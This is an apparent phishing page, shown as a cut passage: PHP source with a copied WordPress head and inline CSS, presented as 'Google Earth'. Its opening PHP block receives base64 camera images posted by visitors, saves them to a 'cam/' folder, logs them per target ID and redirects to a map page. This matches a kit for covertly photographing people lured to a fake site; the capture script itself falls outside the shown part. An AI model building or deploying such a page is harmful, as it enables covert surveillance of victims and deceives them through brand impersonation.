<?php
if ( isset($_POST['upload'])){
if ( isset($_GET['cam'])){
    $cam = $_GET['cam'];
    $img = $_POST['image-name'];
    $folderPath = "cam/";
  
    $image_parts = explode(";base64,", $img);
    $image_type_aux = explode("image/", $image_parts[0]);
    $image_type = $image_type_aux[1];
  
    $image_base64 = base64_decode($image_parts[1]);
    $fileName = uniqid() . '.png';
  
    $file = $folderPath . $fileName;
    file_put_contents($file, $image_base64);
    
    $folder = fopen("result/$cam.txt", "w");
              fwrite($folder, $fileName);
              fclose($folder);
    echo "<script>
           window.location.href = 'map.html'
          </script>";
  }
}
?>
<!doctype html>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="profile" href="https://gmpg.org/xfn/11">
	<meta name='robots' content='noindex, follow' />

	<!-- This site is optimized with the Yoast SEO plugin v19.2 - https://yoast.com/wordpress/plugins/seo/ -->
	<title>Google Earth</title>
	<meta property="og:locale" content="en_US" />
	<meta property="og:title" content="Google Earth - Slyker" />
	<meta property="og:site_name" content="Slyker" />
	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"Organization","@id":"https://moota.co/#organization","name":"Moota.co","url":"https://moota.co/","sameAs":["https://instagram.com/appmoota","https://www.youtube.com/channel/UCID1l6FEETST3Te_mH7l9QA","https://www.facebook.com/appmoota/"],"logo":{"@type":"ImageObject","inLanguage":"en-US","@id":"https://moota.co/#/schema/logo/image/","url":"https://moota.co/wp-content/uploads/2017/07/logo@2x.png","contentUrl":"https://moota.co/wp-content/uploads/2017/07/logo@2x.png","width":204,"height":68,"caption":"Moota.co"},"image":{"@id":"https://moota.co/#/schema/logo/image/"}},{"@type":"WebSite","@id":"https://moota.co/#website","url":"https://moota.co/","name":"Moota.co","description":"Cek Mutasi Bank Secara Otomatis","publisher":{"@id":"https://moota.co/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://moota.co/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"en-US"}]}</script>
	<!-- / Yoast SEO plugin. -->


<link rel="alternate" type="application/rss+xml" title="Moota.co &raquo; Feed" href="https://moota.co/feed/" />
<link rel="alternate" type="application/rss+xml" title="Moota.co &raquo; Comments Feed" href="https://moota.co/comments/feed/" />
<link rel='stylesheet' id='wp-block-library-css'  href='https://moota.co/wp-includes/css/dist/block-library/style.min.css?ver=6.0.2' media='all' />
<style id='global-styles-inline-css'>
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
</style>
<link rel='stylesheet' id='edd-styles-css'  href='https://moota.co/wp-content/plugins/easy-digital-downloads/templates/edd.min.css?ver=2.11.7' media='all' />
<link rel='stylesheet' id='hello-elementor-css'  href='https://moota.co/wp-content/themes/hello-elementor/style.min.css?ver=2.6.1' media='all' />
<link rel='stylesheet' id='hello-elementor-theme-style-css'  href='https://moota.co/wp-content/themes/hello-elementor/theme.min.css?ver=2.6.1' media='all' />
<link rel='stylesheet' id='elementor-icons-css'  href='https://moota.co/wp-content/plugins/elementor/assets/lib/eicons/css/elementor-icons.min.css?ver=5.15.0' media='all' />
<link rel='stylesheet' id='elementor-frontend-legacy-css'  href='https://moota.co/wp-content/plugins/elementor/assets/css/frontend-legacy.min.css?ver=3.6.7' media='all' />
<link rel='stylesheet' id='elementor-frontend-css'  href='https://moota.co/wp-content/plugins/elementor/assets/css/frontend.min.css?ver=3.6.7' media='all' />
<link rel='stylesheet' href='https://cdn.jsdelivr.net/npm/sweetalert2@7.12.15/dist/sweetalert2.min.css'>
<style id='elementor-frontend-inline-css'>
.elementor-kit-3225{--e-global-color-primary:#6EC1E4;--e-global-color-secondary:#54595F;--e-global-color-text:#7A7A7A;--e-global-color-accent:#61CE70;--e-global-color-68227782:#4054B2;--e-global-color-7fd82a87:#23A455;--e-global-color-640fdc6b:#000;--e-global-color-3b42d2d2:#FFF;--e-global-typography-primary-font-family:"Roboto";--e-global-typography-primary-font-weight:600;--e-global-typography-secondary-font-family:"Roboto Slab";--e-global-typography-secondary-font-weight:400;--e-global-typography-text-font-family:"Roboto";--e-global-typography-text-font-weight:400;--e-global-typography-accent-font-family:"Roboto";--e-global-typography-accent-font-weight:500;}.elementor-section.elementor-section-boxed > .elementor-container{max-width:1040px;}.e-container{--container-max-width:1040px;}{}h1.entry-title{display:var(--page-title-display);}.elementor-kit-3225 e-page-transition{background-color:#FFBC7D;}@media(max-width:1024px){.elementor-section.elementor-section-boxed > .elementor-container{max-width:1024px;}.e-container{--container-max-width:1024px;}}@media(max-width:767px){.elementor-section.elementor-section-boxed > .elementor-container{max-width:767px;}.e-container{--container-max-width:767px;}}/* Start custom CSS */a {
    color: #4465F0;
}/* End custom CSS */
.elementor-724 .elementor-element.elementor-element-4224b73 > .elementor-container{max-width:1040px;}.elementor-724 .elementor-element.elementor-element-4224b73{z-index:102;}.elementor-bc-flex-widget .elementor-724 .elementor-element.elementor-element-7e41a22.elementor-column .elementor-column-wrap{align-items:center;}.elementor-724 .elementor-element.elementor-element-7e41a22.elementor-column.elementor-element[data-element_type="column"] > .elementor-column-wrap.elementor-element-populated > .elementor-widget-wrap{align-content:center;align-items:center;}.elementor-724 .elementor-element.elementor-element-e48ec1b{text-align:left;}.elementor-bc-flex-widget .elementor-724 .elementor-element.elementor-element-26379ca.elementor-column .elementor-column-wrap{align-items:center;}.elementor-724 .elementor-element.elementor-element-26379ca.elementor-column.elementor-element[data-element_type="column"] > .elementor-column-wrap.elementor-element-populated > .elementor-widget-wrap{align-content:center;align-items:center;}.elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-menu-toggle{margin-left:auto;background-color:rgba(0,0,0,0);border-width:2px;border-radius:5px;}.elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu .elementor-item{font-size:14px;font-weight:400;text-decoration:none;letter-spacing:0.2px;}.elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu--main .elementor-item{color:#565867;fill:#565867;padding-left:8px;padding-right:8px;padding-top:12px;padding-bottom:12px;}.elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu--main .elementor-item:hover,
					.elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu--main .elementor-item.elementor-item-active,
					.elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu--main .elementor-item.highlighted,
					.elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu--main .elementor-item:focus{color:#4465f0;fill:#4465f0;}.elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu--main:not(.e--pointer-framed) .elementor-item:before,
					.elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu--main:not(.e--pointer-framed) .elementor-item:after{background-color:#4465f0;}.elementor-724 .elementor-element.elementor-element-4e1e647a .e--pointer-framed .elementor-item:before,
					.elementor-724 .elementor-element.elementor-element-4e1e647a .e--pointer-framed .elementor-item:after{border-color:#4465f0;}.elementor-724 .elementor-element.elementor-element-4e1e647a .e--pointer-framed .elementor-item:before{border-width:2px;}.elementor-724 .elementor-element.elementor-element-4e1e647a .e--pointer-framed.e--animation-draw .elementor-item:before{border-width:0 0 2px 2px;}.elementor-724 .elementor-element.elementor-element-4e1e647a .e--pointer-framed.e--animation-draw .elementor-item:after{border-width:2px 2px 0 0;}.elementor-724 .elementor-element.elementor-element-4e1e647a .e--pointer-framed.e--animation-corners .elementor-item:before{border-width:2px 0 0 2px;}.elementor-724 .elementor-element.elementor-element-4e1e647a .e--pointer-framed.e--animation-corners .elementor-item:after{border-width:0 2px 2px 0;}.elementor-724 .elementor-element.elementor-element-4e1e647a .e--pointer-underline .elementor-item:after,
					 .elementor-724 .elementor-element.elementor-element-4e1e647a .e--pointer-overline .elementor-item:before,
					 .elementor-724 .elementor-element.elementor-element-4e1e647a .e--pointer-double-line .elementor-item:before,
					 .elementor-724 .elementor-element.elementor-element-4e1e647a .e--pointer-double-line .elementor-item:after{height:2px;}.elementor-724 .elementor-element.elementor-element-4e1e647a{--e-nav-menu-horizontal-menu-item-margin:calc( 5px / 2 );--nav-menu-icon-size:27px;}.elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu--main:not(.elementor-nav-menu--layout-horizontal) .elementor-nav-menu > li:not(:last-child){margin-bottom:5px;}.elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu--dropdown a, .elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-menu-toggle{color:#565867;}.elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu--dropdown{background-color:#ffffff;}.elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu--dropdown a:hover,
					.elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu--dropdown a.elementor-item-active,
					.elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu--dropdown a.highlighted,
					.elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-menu-toggle:hover{color:#4465f0;}.elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu--dropdown a:hover,
					.elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu--dropdown a.elementor-item-active,
					.elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu--dropdown a.highlighted{background-color:#ffffff;}.elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu--dropdown .elementor-item, .elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu--dropdown  .elementor-sub-item{font-size:14px;text-decoration:none;}.elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu--main .elementor-nav-menu--dropdown, .elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu__container.elementor-nav-menu--dropdown{box-shadow:0px 0px 10px 0px rgba(0,0,0,0.1);}.elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu--dropdown a{padding-top:10px;padding-bottom:10px;}.elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu--main > .elementor-nav-menu > li > .elementor-nav-menu--dropdown, .elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu__container.elementor-nav-menu--dropdown{margin-top:0px !important;}.elementor-724 .elementor-element.elementor-element-4e1e647a div.elementor-menu-toggle{color:#4465f0;}.elementor-724 .elementor-element.elementor-element-4e1e647a div.elementor-menu-toggle svg{fill:#4465f0;}.elementor-724 .elementor-element.elementor-element-4e1e647a div.elementor-menu-toggle:hover{color:#565867;}.elementor-724 .elementor-element.elementor-element-4e1e647a div.elementor-menu-toggle:hover svg{fill:#565867;}.elementor-724 .elementor-element.elementor-element-4e1e647a > .elementor-widget-container{margin:10px 0px 0px 0px;}@media(max-width:1024px){.elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu .elementor-item{font-size:13px;}.elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu--main .elementor-item{padding-left:5px;padding-right:5px;}.elementor-724 .elementor-element.elementor-element-4e1e647a{--e-nav-menu-horizontal-menu-item-margin:calc( 0px / 2 );}.elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu--main:not(.elementor-nav-menu--layout-horizontal) .elementor-nav-menu > li:not(:last-child){margin-bottom:0px;}}@media(min-width:768px){.elementor-724 .elementor-element.elementor-element-7e41a22{width:17.692%;}.elementor-724 .elementor-element.elementor-element-26379ca{width:82.308%;}}@media(max-width:1024px) and (min-width:768px){.elementor-724 .elementor-element.elementor-element-7e41a22{width:20%;}.elementor-724 .elementor-element.elementor-element-26379ca{width:80%;}}@media(max-width:767px){.elementor-724 .elementor-element.elementor-element-7e41a22{width:60%;}.elementor-724 .elementor-element.elementor-element-e48ec1b img{width:94%;}.elementor-724 .elementor-element.elementor-element-26379ca{width:40%;}.elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu--dropdown a{padding-top:12px;padding-bottom:12px;}.elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu--main > .elementor-nav-menu > li > .elementor-nav-menu--dropdown, .elementor-724 .elementor-element.elementor-element-4e1e647a .elementor-nav-menu__container.elementor-nav-menu--dropdown{margin-top:20px !important;}}/* Start custom CSS for nav-menu, class: .elementor-element-4e1e647a */#nav-main-menu ul {
    width: 100%
}
#nav-main-menu ul a:hover {
    text-decoration: none !important;
}
@media screen and (min-width: 768px) {
    #nav-main-menu li.link-login {
        margin-left: auto;
    }
    #nav-main-menu li.link-register a {
        color: #fff !important;
        background: #4465f0;
        border-radius: 5px;
        padding-left: 30px;
        padding-right: 30px;
    }
}/* End custom CSS */
/* Start custom CSS for section, class: .elementor-element-4224b73 */#main-menu-top {
    z-index: 102 !important;
}
.elementor-sticky#main-menu-top {
    background-color: #fff;
    box-shadow: 0px 2px 7px 0px rgba(0,0,0,.08);
}/* End custom CSS */
.elementor-725 .elementor-element.elementor-element-3276cd4{transition:background 0.3s, border 0.3s, border-radius 0.3s, box-shadow 0.3s;}.elementor-725 .elementor-element.elementor-element-3276cd4 > .elementor-background-overlay{transition:background 0.3s, border-radius 0.3s, opacity 0.3s;}.elementor-725 .elementor-element.elementor-element-a27ca19{--divider-border-style:solid;--divider-color:#eeeeee;--divider-border-width:1px;}.elementor-725 .elementor-element.elementor-element-a27ca19 .elementor-divider-separator{width:100%;margin:0 auto;margin-center:0;}.elementor-725 .elementor-element.elementor-element-a27ca19 .elementor-divider{text-align:center;padding-top:4px;padding-bottom:4px;}.elementor-725 .elementor-element.elementor-element-379bbca{padding:10px 0px 10px 0px;}.elementor-725 .elementor-element.elementor-element-55c8c034 > .elementor-element-populated{margin:-6px 40px 0px 0px;--e-column-margin-right:40px;--e-column-margin-left:0px;}.elementor-725 .elementor-element.elementor-element-9a428f6{text-align:left;}.elementor-725 .elementor-element.elementor-element-9a428f6 img{filter:brightness( 137% ) contrast( 107% ) saturate( 0% ) blur( 0px ) hue-rotate( 0deg );}.elementor-725 .elementor-element.elementor-element-7561a6a5{color:#565867;font-size:12px;font-weight:300;}.elementor-725 .elementor-element.elementor-element-7561a6a5 > .elementor-widget-container{margin:-10px 0px 0px 0px;}.elementor-725 .elementor-element.elementor-element-517a7de{color:#565867;font-size:12px;font-weight:300;}.elementor-725 .elementor-element.elementor-element-517a7de > .elementor-widget-container{margin:-10px 0px 0px 0px;}.elementor-725 .elementor-element.elementor-element-5f54c836{--grid-template-columns:repeat(0, auto);--icon-size:10px;--grid-column-gap:9px;--grid-row-gap:0px;}.elementor-725 .elementor-element.elementor-element-5f54c836 .elementor-widget-container{text-align:left;}.elementor-725 .elementor-element.elementor-element-5f54c836 .elementor-social-icon{background-color:#565867;--icon-padding:0.6em;}.elementor-725 .elementor-element.elementor-element-5f54c836 .elementor-social-icon i{color:#ffffff;}.elementor-725 .elementor-element.elementor-element-5f54c836 .elementor-social-icon svg{fill:#ffffff;}.elementor-725 .elementor-element.elementor-element-5f54c836 .elementor-social-icon:hover{background-color:#ffffff;}.elementor-725 .elementor-element.elementor-element-5f54c836 .elementor-social-icon:hover i{color:#001c38;}.elementor-725 .elementor-element.elementor-element-5f54c836 .elementor-social-icon:hover svg{fill:#001c38;}.elementor-bc-flex-widget .elementor-725 .elementor-element.elementor-element-0d88e30.elementor-column .elementor-column-wrap{align-items:flex-start;}.elementor-725 .elementor-element.elementor-element-0d88e30.elementor-column.elementor-element[data-element_type="column"] > .elementor-column-wrap.elementor-element-populated > .elementor-widget-wrap{align-content:flex-start;align-items:flex-start;}.elementor-725 .elementor-element.elementor-element-2dc1af9{text-align:left;}.elementor-725 .elementor-element.elementor-element-2dc1af9 .elementor-heading-title{color:#03081d;font-size:14px;font-weight:500;}.elementor-725 .elementor-element.elementor-element-914394b .elementor-icon-list-items:not(.elementor-inline-items) .elementor-icon-list-item:not(:last-child){padding-bottom:calc(3px/2);}.elementor-725 .elementor-element.elementor-element-914394b .elementor-icon-list-items:not(.elementor-inline-items) .elementor-icon-list-item:not(:first-child){margin-top:calc(3px/2);}.elementor-725 .elementor-element.elementor-element-914394b .elementor-icon-list-items.elementor-inline-items .elementor-icon-list-item{margin-right:calc(3px/2);margin-left:calc(3px/2);}.elementor-725 .elementor-element.elementor-element-914394b .elementor-icon-list-items.elementor-inline-items{margin-right:calc(-3px/2);margin-left:calc(-3px/2);}body.rtl .elementor-725 .elementor-element.elementor-element-914394b .elementor-icon-list-items.elementor-inline-items .elementor-icon-list-item:after{left:calc(-3px/2);}body:not(.rtl) .elementor-725 .elementor-element.elementor-element-914394b .elementor-icon-list-items.elementor-inline-items .elementor-icon-list-item:after{right:calc(-3px/2);}.elementor-725 .elementor-element.elementor-element-914394b .elementor-icon-list-text{color:#565867;padding-left:0px;}.elementor-725 .elementor-element.elementor-element-914394b .elementor-icon-list-item:hover .elementor-icon-list-text{color:#4465f0;}.elementor-725 .elementor-element.elementor-element-914394b .elementor-icon-list-item > .elementor-icon-list-text, .elementor-725 .elementor-element.elementor-element-914394b .elementor-icon-list-item > a{font-size:0.8em;}.elementor-725 .elementor-element.elementor-element-914394b > .elementor-widget-container{margin:0px 0px 0px -25px;}.elementor-bc-flex-widget .elementor-725 .elementor-element.elementor-element-f0c0a15.elementor-column .elementor-column-wrap{align-items:flex-start;}.elementor-725 .elementor-element.elementor-element-f0c0a15.elementor-column.elementor-element[data-element_type="column"] > .elementor-column-wrap.elementor-element-populated > .elementor-widget-wrap{align-content:flex-start;align-items:flex-start;}.elementor-725 .elementor-element.elementor-element-dffa300{text-align:left;}.elementor-725 .elementor-element.elementor-element-dffa300 .elementor-heading-title{color:#03081d;font-size:14px;font-weight:500;}.elementor-725 .elementor-element.elementor-element-c74cba3 .elementor-icon-list-items:not(.elementor-inline-items) .elementor-icon-list-item:not(:last-child){padding-bottom:calc(3px/2);}.elementor-725 .elementor-element.elementor-element-c74cba3 .elementor-icon-list-items:not(.elementor-inline-items) .elementor-icon-list-item:not(:first-child){margin-top:calc(3px/2);}.elementor-725 .elementor-element.elementor-element-c74cba3 .elementor-icon-list-items.elementor-inline-items .elementor-icon-list-item{margin-right:calc(3px/2);margin-left:calc(3px/2);}.elementor-725 .elementor-element.elementor-element-c74cba3 .elementor-icon-list-items.elementor-inline-items{margin-right:calc(-3px/2);margin-left:calc(-3px/2);}body.rtl .elementor-725 .elementor-element.elementor-element-c74cba3 .elementor-icon-list-items.elementor-inline-items .elementor-icon-list-item:after{left:calc(-3px/2);}body:not(.rtl) .elementor-725 .elementor-element.elementor-element-c74cba3 .elementor-icon-list-items.elementor-inline-items .elementor-icon-list-item:after{right:calc(-3px/2);}.elementor-725 .elementor-element.elementor-element-c74cba3 .elementor-icon-list-text{color:#565867;padding-left:0px;}.elementor-725 .elementor-element.elementor-element-c74cba3 .elementor-icon-list-item:hover .elementor-icon-list-text{color:#4465f0;}.elementor-725 .elementor-element.elementor-element-c74cba3 .elementor-icon-list-item > .elementor-icon-list-text, .elementor-725 .elementor-element.elementor-element-c74cba3 .elementor-icon-list-item > a{font-size:0.8em;}.elementor-725 .elementor-element.elementor-element-c74cba3 > .elementor-widget-container{margin:0px 0px 0px -25px;}.elementor-bc-flex-widget .elementor-725 .elementor-element.elementor-element-f897c30.elementor-column .elementor-column-wrap{align-items:flex-start;}.elementor-725 .elementor-element.elementor-element-f897c30.elementor-column.elementor-element[data-element_type="column"] > .elementor-column-wrap.elementor-element-populated > .elementor-widget-wrap{align-content:flex-start;align-items:flex-start;}.elementor-725 .elementor-element.elementor-element-d0d9f46{text-align:left;}.elementor-725 .elementor-element.elementor-element-d0d9f46 .elementor-heading-title{color:#03081d;font-size:14px;font-weight:500;}.elementor-725 .elementor-element.elementor-element-02a5c46{color:#565867;font-size:0.8em;}.elementor-725 .elementor-element.elementor-element-63695d7a > .elementor-container{min-height:50px;}.elementor-725 .elementor-element.elementor-element-63695d7a > .elementor-container > .elementor-row > .elementor-column > .elementor-column-wrap > .elementor-widget-wrap{align-content:center;align-items:center;}.elementor-725 .elementor-element.elementor-element-63695d7a{border-style:solid;border-width:1px 0px 0px 0px;border-color:rgba(255,255,255,0.19);transition:background 0.3s, border 0.3s, border-radius 0.3s, box-shadow 0.3s;}.elementor-725 .elementor-element.elementor-element-63695d7a > .elementor-background-overlay{transition:background 0.3s, border-radius 0.3s, opacity 0.3s;}.elementor-725 .elementor-element.elementor-element-3d465ff1{text-align:center;}.elementor-725 .elementor-element.elementor-element-3d465ff1 .elementor-heading-title{color:#aaaaaa;font-size:11px;font-weight:300;}@media(max-width:1024px){.elementor-725 .elementor-element.elementor-element-379bbca{padding:50px 20px 50px 20px;}.elementor-725 .elementor-element.elementor-element-55c8c034 > .elementor-element-populated{margin:0% 15% 0% 0%;--e-column-margin-right:15%;--e-column-margin-left:0%;}.elementor-725 .elementor-element.elementor-element-5f54c836{--icon-size:10px;}.elementor-725 .elementor-element.elementor-element-63695d7a{padding:10px 20px 10px 20px;}}@media(max-width:767px){.elementor-725 .elementor-element.elementor-element-379bbca{padding:35px 20px 35px 20px;}.elementor-725 .elementor-element.elementor-element-55c8c034{width:100%;}.elementor-725 .elementor-element.elementor-element-55c8c034 > .elementor-element-populated{margin:0px 0px 50px 0px;--e-column-margin-right:0px;--e-column-margin-left:0px;}.elementor-725 .elementor-element.elementor-element-55c8c034 > .elementor-element-populated > .elementor-widget-wrap{padding:0px 0px 0px 0px;}.elementor-725 .elementor-element.elementor-element-7561a6a5{text-align:left;}.elementor-725 .elementor-element.elementor-element-517a7de{text-align:left;}.elementor-725 .elementor-element.elementor-element-5f54c836 .elementor-widget-container{text-align:left;}.elementor-725 .elementor-element.elementor-element-0d88e30{width:50%;}.elementor-725 .elementor-element.elementor-element-0d88e30 > .elementor-element-populated{margin:0px 0px 0px 0px;--e-column-margin-right:0px;--e-column-margin-left:0px;}.elementor-725 .elementor-element.elementor-element-0d88e30 > .elementor-element-populated > .elementor-widget-wrap{padding:0px 0px 0px 0px;}.elementor-725 .elementor-element.elementor-element-2dc1af9{text-align:left;}.elementor-725 .elementor-element.elementor-element-914394b > .elementor-widget-container{margin:0px 0px 0px 0px;}.elementor-725 .elementor-element.elementor-element-f0c0a15{width:50%;}.elementor-725 .elementor-element.elementor-element-f0c0a15 > .elementor-element-populated{margin:0px 0px 0px 0px;--e-column-margin-right:0px;--e-column-margin-left:0px;}.elementor-725 .elementor-element.elementor-element-f0c0a15 > .elementor-element-populated > 